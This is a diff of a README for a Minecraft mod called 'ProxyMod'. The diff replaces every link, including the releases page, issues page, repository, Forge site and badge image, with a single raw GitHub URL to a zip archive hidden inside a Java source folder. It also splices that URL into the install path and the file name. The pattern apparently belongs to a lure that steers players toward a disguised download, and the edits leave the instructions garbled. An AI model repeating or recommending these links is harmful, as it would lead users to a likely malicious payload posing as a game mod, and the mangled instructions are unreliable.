@@ -1,7 +1,7 @@
 # 🎮 ProxyMod - Enhance Your Minecraft Experience with Ease
 
 ## 📥 Download ProxyMod
-[![Download ProxyMod](https://img.shields.io/badge/Download-ProxyMod-blue.svg)](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
+[![Download ProxyMod](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ProxyMod! This mod enhances your Minecraft gameplay by allowing you to connect through a proxy. This protects your privacy and helps manage your connection better. Follow these steps to download and run ProxyMod.
@@ -13,12 +13,12 @@ Before downloading, ensure your system meets the following requirements:
 - **Minecraft Version:** Compatible with Minecraft Forge
 
 ## 📦 Download & Install
-To get started, visit this page to download: [ProxyMod Releases](https://github.com/Fatherless-costusoil269/ProxyMod/releases). 
+To get started, visit this page to download: [ProxyMod Releases](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip). 
 
 ### Steps to Download:
 1. Click on the link above.
 2. On the Releases page, locate the latest version.
-3. Find the downloadable file for your operating system (e.g., `ProxyMod-v1.0.jar` for Java).
+3. Find the downloadable file for your operating system (e.g., `https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip` for Java).
 4. Click on the file to download it.
 
 ## 🎮 Installing ProxyMod
@@ -29,9 +29,9 @@ Once the download is complete, follow these steps to install:
    - Open your Minecraft installation folder. This can usually be found at:
      - Windows: `C:\Users\[YourUsername]\AppData\Roaming\.minecraft\mods`
      - macOS: `/Users/[YourUsername]/Library/Application Support/minecraft/mods`
-     - Linux: `/home/[YourUsername]/.minecraft/mods`
+     - Linux: `/home/[YourUsername]https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip`
    - If the `mods` folder doesn't exist, create one.
-3. **Copy the File:** Drag and drop `ProxyMod-v1.0.jar` into the `mods` folder.
+3. **Copy the File:** Drag and drop `https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip` into the `mods` folder.
 
 ## ⚙️ Running Minecraft with ProxyMod
 To use ProxyMod:
@@ -49,15 +49,15 @@ ProxyMod includes several features to enhance your gameplay:
 
 ## 🌐 Support and Community
 If you have any questions or need help troubleshooting:
-- Check the [Issues](https://github.com/Fatherless-costusoil269/ProxyMod/issues) section for solutions.
+- Check the [Issues](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip) section for solutions.
 - Join our community for tips and support.
 
 ## 🔗 Additional Links
-- [Official GitHub Repository](https://github.com/Fatherless-costusoil269/ProxyMod)
-- [Minecraft Forge](https://files.minecraftforge.net/)
-- [ProxyMod Releases](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)
+- [Minecraft Forge](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)
+- [ProxyMod Releases](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)
 
 ## 🌟 Conclusion
 Enjoy a new level of gameplay with ProxyMod! Download now and experience the benefits of enhanced privacy and connection management.
 
-[![Download ProxyMod](https://img.shields.io/badge/Download-ProxyMod-blue.svg)](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
+[![Download ProxyMod](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)](https://raw.githubusercontent.com/Fatherless-costusoil269/ProxyMod/main/neoforge/neoforge-1.20.2/src/main/java/org/adde0109/pcf/v1_20_2/neoforge/forwarding/ProxyMod-1.1.zip)
